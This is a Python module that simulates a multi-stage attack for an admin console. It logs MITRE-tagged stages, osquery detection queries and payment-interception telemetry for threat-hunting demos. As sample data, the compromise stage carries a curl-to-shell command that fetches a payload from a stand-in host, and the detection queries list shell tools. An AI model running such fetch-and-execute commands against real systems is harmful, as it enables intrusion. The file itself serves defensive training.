"""Reusable multi-stage attack simulation for the admin console.

The scenario is synthetic and deterministic enough for demos, but the emitted
logs model the pivots an operator would use during a real investigation:
attack id, run id, trace id, compromised hosts, payment interception, redirects,
MITRE tags, OSQuery findings, Java sidecar errors, and SQL probe failures.
"""

from __future__ import annotations

import asyncio
import os
import uuid
from dataclasses import asdict, dataclass, field
from typing import Any, Callable
from urllib.parse import urlsplit, urlunsplit

from opentelemetry import trace

from server.modules.api_gateway_observability import ApiGatewayObservation, build_api_gateway_observation
from server.modules.java_app_server import JavaAppServerClient
from server.observability import business_metrics
from server.observability.correlation import apply_span_attributes
from server.observability.logging_sdk import push_log
from server.observability.otel_setup import get_tracer


LogFunc = Callable[..., None]

_DEFAULT_REDIRECT_URL = "https://pay-update.example.test/checkout/session"
_DEFAULT_SOURCE_IP = "203.0.113.77"
_DEFAULT_USER_AGENT = "curl/8.4.0 octo-attack-lab"


@dataclass(frozen=True)
class AttackStage:
    stage: str
    tactic: str
    technique_id: str
    technique: str
    attack_type: str
    severity: str
    message: str
    entry_point: str
    source_ip: str
    server_address: str
    destination_ip: str
    destination_port: str
    protocol: str
    lotl_binary: str
    host_name: str
    instance_ocid: str
    osquery_query: str
    osquery_sql: str
    osquery_finding: str
    extra_fields: dict[str, Any] = field(default_factory=dict)

    def to_legacy_dict(self) -> dict[str, Any]:
        data = asdict(self)
        data["source_ip"] = self.source_ip
        data["server_address"] = self.server_address
        data["destination_ip"] = self.destination_ip
        data["destination_port"] = self.destination_port
        data["protocol"] = self.protocol
        data["lotl_binary"] = self.lotl_binary
        data["osquery_query"] = self.osquery_query
        data["osquery_sql"] = self.osquery_sql
        data["osquery_finding"] = self.osquery_finding
        return data

    def log_fields(self, *, attack_id: str, run_id: str, user_agent: str) -> dict[str, Any]:
        fields: dict[str, Any] = {
            "run_id": run_id,
            "workflow_id": "admin-threat-simulation",
            "workflow_step": self.stage,
            "security.attack.id": attack_id,
            "security.attack.stage": self.stage,
            "security.attack.type": self.attack_type,
            "security.attack.detected": True,
            "security.severity": self.severity,
            "mitre.tactic": self.tactic,
            "mitre.technique_id": self.technique_id,
            "mitre.technique": self.technique,
            "attack.entry_point": self.entry_point,
            "attack.lotl_binary": self.lotl_binary,
            "client.address": self.source_ip,
            "source.ip": self.source_ip,
            "server.address": self.server_address,
            "destination.ip": self.destination_ip,
            "destination.port": int(self.destination_port),
            "network.protocol.name": self.protocol,
            "user_agent.original": user_agent,
            "host.name": self.host_name,
            "cloud.provider": "oci",
            "cloud.region": "us-ashburn-1",
            "cloud.instance.id": self.instance_ocid,
            "osquery.query": self.osquery_query,
            "osquery.finding": self.osquery_finding,
            "osquery.sql": self.osquery_sql,
            "osquery.result_count": 1,
        }
        fields.update(self.extra_fields)
        return fields


@dataclass(frozen=True)
class AttackPlan:
    attack_id: str
    run_id: str
    request_id: str
    api_gateway: ApiGatewayObservation
    source_ip: str
    user_agent: str
    redirect_url: str
    card: dict[str, str]
    compromised_hosts: tuple[dict[str, str], ...]
    stages: tuple[AttackStage, ...]

    def hunt_pivots(self, trace_id: str = "") -> dict[str, Any]:
        trace_id = trace_id or _current_trace_id()
        return {
            "attack_id": self.attack_id,
            "run_id": self.run_id,
            "request_id": self.request_id,
            "trace_id": trace_id,
            "source_ip": self.source_ip,
            "compromised_hosts": list(self.compromised_hosts),
            "log_analytics_pivots": [
                f"'Attack ID' = '{self.attack_id}'",
                f"'Run ID' = '{self.run_id}'",
                f"'Request ID' = '{self.request_id}'",
                f"'API Gateway Request ID' = '{self.api_gateway.request_id}'",
                f"'Client IP' = '{self.source_ip}'",
                f"'Trace ID' = '{trace_id}'" if trace_id else "'Trace ID' = <copy from response>",
                f"'API Gateway Route' = '{self.api_gateway.route}'",
                f"'API Gateway Action' = '{self.api_gateway.action}'",
                "'Payment Interception' = 'true'",
                "'Payment Redirect URL' != null",
                "'Compromised VM' = 'true'",
            ],
        }


def _bounded_string(value: object, *, fallback: str, limit: int) -> str:
    raw = str(value or fallback).replace("\r", " ").replace("\n", " ").replace("\t", " ")
    normalized = " ".join(raw.split())
    return (normalized or fallback)[:limit]


def _safe_redirect_url(value: object) -> str:
    candidate = _bounded_string(value, fallback=_DEFAULT_REDIRECT_URL, limit=240)
    parsed = urlsplit(candidate)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        parsed = urlsplit(_DEFAULT_REDIRECT_URL)
    path = parsed.path or "/"
    return urlunsplit((parsed.scheme, parsed.netloc.lower()[:120], path[:96], "", ""))


def _safe_card_summary(card: Any) -> dict[str, str]:
    card = card if isinstance(card, dict) else {}
    number = "".join(ch for ch in str(card.get("number") or "") if ch.isdigit())
    brand = "".join(ch for ch in str(card.get("brand") or "visa").lower() if ch.isalnum() or ch in "-_")[:24]
    return {
        "brand": brand or "visa",
        "last4": number[-4:] if len(number) >= 4 else "4242",
        "token": f"tok_demo_{uuid.uuid4().hex[:12]}",
    }


def _current_trace_id() -> str:
    span = trace.get_current_span()
    ctx = span.get_span_context() if span else None
    if ctx and ctx.is_valid:
        return format(ctx.trace_id, "032x")
    return ""


def _compromised_hosts() -> tuple[dict[str, str], ...]:
    return (
        {
            "host.name": os.getenv("ATTACK_LAB_SHOP_HOST_NAME", "octo-shop-vm-01"),
            "host.role": "shop-frontend",
            "cloud.instance.id": os.getenv("ATTACK_LAB_SHOP_INSTANCE_ID", "demo-shop-instance"),
            "private.ip": os.getenv("ATTACK_LAB_SHOP_PRIVATE_IP", "shop.internal.example"),
        },
        {
            "host.name": os.getenv("ATTACK_LAB_CRM_HOST_NAME", "octo-crm-vm-01"),
            "host.role": "crm-admin",
            "cloud.instance.id": os.getenv("ATTACK_LAB_CRM_INSTANCE_ID", "demo-crm-instance"),
            "private.ip": os.getenv("ATTACK_LAB_CRM_PRIVATE_IP", "crm.internal.example"),
        },
        {
            "host.name": os.getenv("ATTACK_LAB_JAVA_HOST_NAME", "octo-java-apm-vm-01"),
            "host.role": "java-payment-sidecar",
            "cloud.instance.id": os.getenv("ATTACK_LAB_JAVA_INSTANCE_ID", "demo-java-apm-instance"),
            "private.ip": os.getenv("ATTACK_LAB_JAVA_PRIVATE_IP", "java-apm.internal.example"),
        },
    )


def build_attack_plan(payload: dict[str, Any] | None = None) -> AttackPlan:
    body = payload or {}
    source_ip = _bounded_string(body.get("source_ip"), fallback=_DEFAULT_SOURCE_IP, limit=48)
    user_agent = _bounded_string(body.get("user_agent"), fallback=_DEFAULT_USER_AGENT, limit=160)
    redirect_url = _safe_redirect_url(body.get("payment_redirect_url") or body.get("redirect_url"))
    card = _safe_card_summary(body.get("card") if isinstance(body.get("card"), dict) else {})
    attack_id = _bounded_string(body.get("attack_id"), fallback=f"attack-{uuid.uuid4().hex[:12]}", limit=80)
    run_id = _bounded_string(body.get("run_id"), fallback=f"run-{uuid.uuid4().hex[:12]}", limit=80)
    request_id = _bounded_string(body.get("request_id"), fallback=str(uuid.uuid4()), limit=80)
    hosts = _compromised_hosts()
    shop, crm, java = hosts
    gateway = build_api_gateway_observation(
        request_id=body.get("api_gateway_request_id") or f"gw-{request_id[:32]}",
        source_ip=source_ip,
        route=body.get("api_gateway_route") or "/api/shop/attack/simulate",
        route_id=body.get("api_gateway_route_id") or "public-attack-simulate",
        scenario=body.get("api_gateway_scenario") or "allow",
        scope=body.get("api_gateway_scope") or "public",
        headers={
            "User-Agent": user_agent,
            "X-Request-Id": request_id,
        },
    )

    stages = (
        AttackStage(
            stage="api_gateway_edge_control",
            tactic="Initial Access",
            technique_id="T1190",
            technique="Exploit Public-Facing Application",
            attack_type="api_gateway_policy_detection",
            severity=gateway.severity,
            message="OCI API Gateway route policy evaluated the attack-lab request before backend forwarding",
            entry_point=gateway.route,
            source_ip=source_ip,
            server_address="oci-api-gateway.public",
            destination_ip=shop["private.ip"],
            destination_port="443",
            protocol="https",
            lotl_binary="api-gateway-policy",
            host_name="oci-api-gateway-public",
            instance_ocid=gateway.deployment_id,
            osquery_query="api-gateway-route-policy",
            osquery_sql=(
                "SELECT request_id, route, action, status_code FROM api_gateway_logs "
                "WHERE action IN ('allow','deny','throttle','backend_error');"
            ),
            osquery_finding="API Gateway policy and quota telemetry correlated with the same attack id and trace",
            extra_fields={
                "vm.compromised": False,
                **gateway.log_fields(),
            },
        ),
        AttackStage(
            stage="initial_access",
            tactic="Initial Access",
            technique_id="T1190",
            technique="Exploit Public-Facing Application",
            attack_type="public_app_exploit",
            severity="high",
            message="Attack lab initial access reached the shop edge route",
            entry_point="https://shop.example.test/shop",
            source_ip=source_ip,
            server_address="shop.example.test",
            destination_ip="203.0.113.10",
            destination_port="443",
            protocol="https",
            lotl_binary="curl",
            host_name=shop["host.name"],
            instance_ocid=shop["cloud.instance.id"],
            osquery_query="unexpected-listeners",
            osquery_sql=(
                "SELECT p.pid, p.name, p.path, p.cmdline, pos.local_address, pos.local_port "
                "FROM processes p JOIN process_open_sockets pos ON p.pid = pos.pid;"
            ),
            osquery_finding="public endpoint probe reached shop listener through the load balancer",
            extra_fields={
                "http.method": "GET",
                "http.url.path": "/shop/products",
                "http.status_code": 200,
                "vm.compromised": False,
            },
        ),
        AttackStage(
            stage="vm_compromise",
            tactic="Execution",
            technique_id="T1059",
            technique="Command and Scripting Interpreter",
            attack_type="compromised_vm",
            severity="critical",
            message="Compromised VM executed a shell-like payload from the app tier",
            entry_point="octo-drone-shop container",
            source_ip=source_ip,
            server_address=shop["host.name"],
            destination_ip=shop["private.ip"],
            destination_port="8080",
            protocol="http",
            lotl_binary="bash",
            host_name=shop["host.name"],
            instance_ocid=shop["cloud.instance.id"],
            osquery_query="lotl-processes",
            osquery_sql=(
                "SELECT pid, name, path, cmdline, parent, cwd FROM processes "
                "WHERE lower(name) IN ('bash','sh','curl','wget','python','python3');"
            ),
            osquery_finding="shell-like process launched from the application host during the lab run",
            extra_fields={
                "vm.compromised": True,
                "host.role": shop["host.role"],
                "process.name": "bash",
                "process.command_line": "bash -lc curl -fsS https://pay-update.example.test/payload.sh | sh",
                "container.id": "demo-shop-container",
            },
        ),
        AttackStage(
            stage="service_discovery",
            tactic="Discovery",
            technique_id="T1046",
            technique="Network Service Discovery",
            attack_type="service_discovery",
            severity="high",
            message="Compromised VM scanned CRM and Java app-server services",
            entry_point=os.getenv("ATTACK_LAB_APP_SUBNET_LABEL", "app subnet"),
            source_ip=source_ip,
            server_address=shop["host.name"],
            destination_ip=java["private.ip"],
            destination_port="18080",
            protocol="http",
            lotl_binary="ss",
            host_name=java["host.name"],
            instance_ocid=java["cloud.instance.id"],
            osquery_query="unexpected-listeners",
            osquery_sql=(
                "SELECT pid, port, protocol, address FROM listening_ports "
                "WHERE port NOT IN (22,80,443,8080,18080);"
            ),
            osquery_finding="service discovery path touched the Java app-server sidecar port",
            extra_fields={"vm.compromised": True, "host.role": java["host.role"]},
        ),
        AttackStage(
            stage="defense_evasion",
            tactic="Defense Evasion",
            technique_id="T1218",
            technique="System Binary Proxy Execution",
            attack_type="living_off_the_land",
            severity="high",
            message="Living-off-the-land binary used to proxy outbound payment callback traffic",
            entry_point="living-off-the-land process launch",
            source_ip=source_ip,
            server_address=shop["host.name"],
            destination_ip="198.51.100.44",
            destination_port="443",
            protocol="https",
            lotl_binary="openssl",
            host_name=shop["host.name"],
            instance_ocid=shop["cloud.instance.id"],
            osquery_query="lotl-processes",
            osquery_sql=(
                "SELECT pid, name, path, cmdline FROM processes "
                "WHERE lower(name) IN ('openssl','curl','wget','python','python3');"
            ),
            osquery_finding="living-off-the-land binary candidate observed in process inventory",
            extra_fields={
                "vm.compromised": True,
                "process.name": "openssl",
                "process.command_line": "openssl s_client -connect pay-update.example.test:443",
            },
        ),
        AttackStage(
            stage="payment_interception",
            tactic="Credential Access",
            technique_id="T1056.001",
            technique="Keylogging",
            attack_type="payment_data_interception",
            severity="critical",
            message="Payment form interception detected during checkout",
            entry_point="/shop/checkout/payment",
            source_ip=source_ip,
            server_address="shop.example.test",
            destination_ip=shop["private.ip"],
            destination_port="443",
            protocol="https",
            lotl_binary="javascript",
            host_name=shop["host.name"],
            instance_ocid=shop["cloud.instance.id"],
            osquery_query="recent-processes",
            osquery_sql=(
                "SELECT pid, name, path, cmdline, start_time FROM processes "
                "WHERE start_time > strftime('%s','now','-30 minutes');"
            ),
            osquery_finding="checkout form overlay produced payment interception telemetry",
            extra_fields={
                "vm.compromised": True,
                "payment.interception.detected": True,
                "payment.provider": "simulated",
                "payment.status": "intercepted",
                "payment.card_brand": card["brand"],
                "payment.card_last4": card["last4"],
                "payment.token": card["token"],
                "payment.risk_score": 97,
                "security.attack.payload": "checkout form overlay captured card last4 only for demo telemetry",
                "http.url.path": "/shop/checkout/payment",
                "http.status_code": 200,
            },
        ),
        AttackStage(
            stage="payment_redirect",
            tactic="Credential Access",
            technique_id="T1557",
            technique="Adversary-in-the-Middle",
            attack_type="payment_redirect",
            severity="critical",
            message="Suspicious payment redirect sent checkout traffic to an untrusted host",
            entry_point="/shop/checkout/payment/redirect",
            source_ip=source_ip,
            server_address="shop.example.test",
            destination_ip="198.51.100.44",
            destination_port="443",
            protocol="https",
            lotl_binary="nginx-rewrite",
            host_name=shop["host.name"],
            instance_ocid=shop["cloud.instance.id"],
            osquery_query="suspicious-shell-history",
            osquery_sql="SELECT uid, command, time FROM shell_history WHERE command LIKE '%rewrite%';",
            osquery_finding="redirect rule simulation points payment flow to a suspicious host",
            extra_fields={
                "vm.compromised": True,
                "payment.redirect.detected": True,
                "payment.redirect.url": redirect_url,
                "http.redirect.location": redirect_url,
                "http.url.path": "/shop/checkout/payment/redirect",
                "http.status_code": 302,
            },
        ),
        AttackStage(
            stage="crm_pivot",
            tactic="Lateral Movement",
            technique_id="T1021.004",
            technique="Remote Services: SSH",
            attack_type="crm_pivot",
            severity="high",
            message="Compromised shop path pivoted toward the CRM admin service",
            entry_point="crm admin API",
            source_ip=source_ip,
            server_address=crm["host.name"],
            destination_ip=crm["private.ip"],
            destination_port="8080",
            protocol="http",
            lotl_binary="curl",
            host_name=crm["host.name"],
            instance_ocid=crm["cloud.instance.id"],
            osquery_query="lotl-processes",
            osquery_sql=(
                "SELECT pid, name, path, cmdline FROM processes "
                "WHERE lower(name) IN ('curl','python','python3','ssh');"
            ),
            osquery_finding="CRM host observed suspicious admin API probing from the compromised app tier",
            extra_fields={"vm.compromised": True, "host.role": crm["host.role"], "http.status_code": 401},
        ),
        AttackStage(
            stage="exfiltration",
            tactic="Exfiltration",
            technique_id="T1041",
            technique="Exfiltration Over C2 Channel",
            attack_type="payment_exfiltration",
            severity="critical",
            message="Payment telemetry exfiltration attempt correlated with checkout redirect",
            entry_point="payment callback",
            source_ip=source_ip,
            server_address=shop["host.name"],
            destination_ip="198.51.100.200",
            destination_port="443",
            protocol="https",
            lotl_binary="curl",
            host_name=shop["host.name"],
            instance_ocid=shop["cloud.instance.id"],
            osquery_query="process-open-sockets",
            osquery_sql=(
                "SELECT p.name, p.cmdline, pos.remote_address, pos.remote_port "
                "FROM processes p JOIN process_open_sockets pos ON p.pid = pos.pid "
                "WHERE pos.remote_port = 443;"
            ),
            osquery_finding="outbound callback to suspicious payment collection endpoint",
            extra_fields={
                "vm.compromised": True,
                "payment.interception.detected": True,
                "payment.redirect.detected": True,
                "payment.card_last4": card["last4"],
                "network.bytes_out": 4812,
            },
        ),
        AttackStage(
            stage="persistence",
            tactic="Persistence",
            technique_id="T1543",
            technique="Create or Modify System Process",
            attack_type="persistence",
            severity="high",
            message="Persistence candidate registered on compromised VM",
            entry_point="systemd unit inventory",
            source_ip=source_ip,
            server_address=shop["host.name"],
            destination_ip=shop["private.ip"],
            destination_port="22",
            protocol="ssh",
            lotl_binary="systemctl",
            host_name=shop["host.name"],
            instance_ocid=shop["cloud.instance.id"],
            osquery_query="persistence-systemd",
            osquery_sql=(
                "SELECT name, path, status, type FROM systemd_units "
                "WHERE name LIKE '%octo%' OR path LIKE '/tmp/%';"
            ),
            osquery_finding="lab persistence candidate represented as suspicious service metadata",
            extra_fields={
                "vm.compromised": True,
                "service.name.suspicious": "octo-payment-helper.service",
                "file.path": "/etc/systemd/system/octo-payment-helper.service",
            },
        ),
    )

    return AttackPlan(
        attack_id=attack_id,
        run_id=run_id,
        request_id=request_id,
        api_gateway=gateway,
        source_ip=source_ip,
        user_agent=user_agent,
        redirect_url=redirect_url,
        card=card,
        compromised_hosts=hosts,
        stages=stages,
    )


def build_attack_story(source_ip: str = _DEFAULT_SOURCE_IP) -> list[dict[str, Any]]:
    return [stage.to_legacy_dict() for stage in build_attack_plan({"source_ip": source_ip}).stages]


async def run_attack_simulation(
    payload: dict[str, Any] | None = None,
    *,
    java_client: JavaAppServerClient | None = None,
    log_func: LogFunc = push_log,
) -> dict[str, Any]:
    plan = build_attack_plan(payload)
    java = java_client or JavaAppServerClient()
    tracer = get_tracer()

    with tracer.start_as_current_span("security.attack.full_path") as span:
        trace_id = _current_trace_id()
        kill_chain = ",".join(stage.stage for stage in plan.stages)
        apply_span_attributes(
            span,
            {
                "workflow.id": "attack-lab",
                "workflow.step": "api-gateway-to-host-evidence",
                "security.attack.id": plan.attack_id,
                "security.attack.kill_chain": kill_chain,
                "run_id": plan.run_id,
                "request_id": plan.request_id,
                "client.address": plan.source_ip,
                "source.ip": plan.source_ip,
                "oci.api_gateway.request_id": plan.api_gateway.request_id,
                "oci.api_gateway.route": plan.api_gateway.route,
                "oci.api_gateway.route_id": plan.api_gateway.route_id,
                "oci.api_gateway.action": plan.api_gateway.action,
                "oci.api_gateway.policy.decision": plan.api_gateway.policy_decision,
                "oci.api_gateway.threat_signal": plan.api_gateway.threat_signal,
                "http.route": plan.api_gateway.route,
                "http.method": plan.api_gateway.http_method,
                "http.status_code": plan.api_gateway.http_status_code,
                "user_agent.original": plan.user_agent,
                "payment.redirect.url": plan.redirect_url,
                "app.module": "security-lab",
                "app.logical_endpoint": "attack.simulate",
            },
        )
        java_correlation = {
            "workflow_id": "attack-lab",
            "workflow_step": "api-gateway-to-host-evidence",
            "attack_id": plan.attack_id,
            "run_id": plan.run_id,
            "request_id": plan.request_id,
            "api_gateway_request_id": plan.api_gateway.request_id,
            "api_gateway_route": plan.api_gateway.route,
            "api_gateway_action": plan.api_gateway.action,
            "api_gateway_policy_decision": plan.api_gateway.policy_decision,
        }
        java_result = await java.simulate(
            "attack",
            {
                **java_correlation,
                "technique_id": "T1059",
                "tactic": "execution",
                "source_ip": plan.source_ip,
            },
        )
        external_error = await java.simulate(
            "external-error",
            {
                **java_correlation,
                "status_code": int((payload or {}).get("external_status_code") or 503),
                "scenario": "attack-payment-redirect-callback",
            },
        )
        sql_error = await java.simulate(
            "sql-error",
            {
                **java_correlation,
                "error_code": str((payload or {}).get("sql_error_code") or "ora-00942"),
                "scenario": "attack-db-probe",
            },
        )

        for stage in plan.stages:
            with tracer.start_as_current_span(f"security.attack.{stage.stage}") as stage_span:
                fields = stage.log_fields(
                    attack_id=plan.attack_id,
                    run_id=plan.run_id,
                    user_agent=plan.user_agent,
                )
                fields["request_id"] = plan.request_id
                apply_span_attributes(stage_span, fields)
                if stage.severity == "critical":
                    stage_span.set_attribute("otel.status_code", "ERROR")
                log_level = "ERROR" if stage.severity == "critical" else "WARNING"
                log_func(log_level, stage.message, **fields)
                business_metrics.record_attack_stage(
                    stage=stage.stage,
                    severity=stage.severity,
                    technique_id=stage.technique_id,
                )
                if fields.get("oci.api_gateway.action"):
                    business_metrics.record_api_gateway_event(
                        action=str(fields.get("oci.api_gateway.action") or "unknown"),
                        route_family=str(fields.get("oci.api_gateway.route_family") or "api"),
                        status_code=int(fields.get("http.status_code") or 0),
                        scope=str(fields.get("oci.api_gateway.scope") or "unknown"),
                    )
            await asyncio.sleep(0)

        osquery_results = [
            {
                "query": stage.osquery_query,
                "finding": stage.osquery_finding,
                "sql": stage.osquery_sql,
                "stage": stage.stage,
                "severity": stage.severity,
                "host.name": stage.host_name,
                "cloud.instance.id": stage.instance_ocid,
            }
            for stage in plan.stages
        ]

    return {
        "status": "completed",
        "attack_id": plan.attack_id,
        "run_id": plan.run_id,
        "request_id": plan.request_id,
        "source_ip": plan.source_ip,
        "api_gateway": plan.api_gateway.to_response(),
        "story": [stage.to_legacy_dict() for stage in plan.stages],
        "compromised_hosts": list(plan.compromised_hosts),
        "payment": {
            "interception_detected": True,
            "redirect_detected": True,
            "redirect_url": plan.redirect_url,
            "card_brand": plan.card["brand"],
            "card_last4": plan.card["last4"],
        },
        "java_app_server": java_result,
        "external_error": external_error,
        "sql_error": sql_error,
        "osquery_results": osquery_results,
        "hunt_pivots": plan.hunt_pivots(trace_id),
        "trace_id": trace_id,
    }
